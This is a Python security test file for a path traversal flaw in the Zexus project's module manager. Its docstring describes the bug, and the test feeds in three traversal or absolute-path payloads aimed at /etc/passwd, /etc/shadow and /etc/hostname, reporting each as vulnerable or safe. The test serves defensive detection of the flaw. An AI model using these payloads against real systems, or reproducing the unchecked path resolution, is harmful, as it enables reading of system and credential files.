"""
TEST 08: Path Traversal in Module Manager
==========================================

VULNERABILITY: ModuleManager.resolve_module_path() does not verify that the
resolved path stays within allowed directories. A Zexus program can import
modules using traversal paths like "./../../etc/passwd" to read arbitrary
files on the filesystem.

LOCATION: src/zexus/module_manager.py, lines 31-36

SEVERITY: HIGH - Arbitrary File Read

ATTACK VECTOR: Use relative path with ".." sequences to escape the project
directory and access system files.
"""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))

from zexus.module_manager import ModuleManager


def test_module_path_traversal():
    """Demonstrate path traversal in module resolution."""
    results = []

    mm = ModuleManager(base_path="/home/user/project")

    # --- Payload 1: Relative path traversal ---
    # Attacker imports: ./../../etc/passwd
    # After stripping "./": "../../etc/passwd"
    # (base / "../../etc/passwd").resolve() → /etc/passwd
    traversal_path = "./../../etc/passwd"
    resolved = mm.resolve_module_path(traversal_path)

    results.append({
        "payload": traversal_path,
        "type": "relative_traversal",
        "exploited": resolved is not None and "/etc/passwd" in resolved,
        "detail": f"Resolved to: {resolved!r}",
    })

    # --- Payload 2: Absolute path bypass ---
    abs_path = "/etc/shadow"
    resolved2 = mm.resolve_module_path(abs_path)

    results.append({
        "payload": abs_path,
        "type": "absolute_path_escape",
        "exploited": resolved2 is not None and "/etc/shadow" in resolved2,
        "detail": f"Resolved to: {resolved2!r}",
    })

    # --- Payload 3: Bare module name with traversal ---
    bare_path = "../../../etc/hostname"
    resolved3 = mm.resolve_module_path(bare_path)

    results.append({
        "payload": bare_path,
        "type": "bare_path_traversal",
        "exploited": resolved3 is not None and "/etc/hostname" in resolved3,
        "detail": f"Resolved to: {resolved3!r}",
    })

    return results


if __name__ == "__main__":
    print("=" * 70)
    print("TEST 08: Path Traversal in Module Manager")
    print("=" * 70)
    for r in test_module_path_traversal():
        status = "VULNERABLE" if r["exploited"] else "SAFE"
        print(f"\n[{status}] {r['type']}")
        print(f"  Payload: {r['payload']}")
        print(f"  Detail:  {r['detail']}")
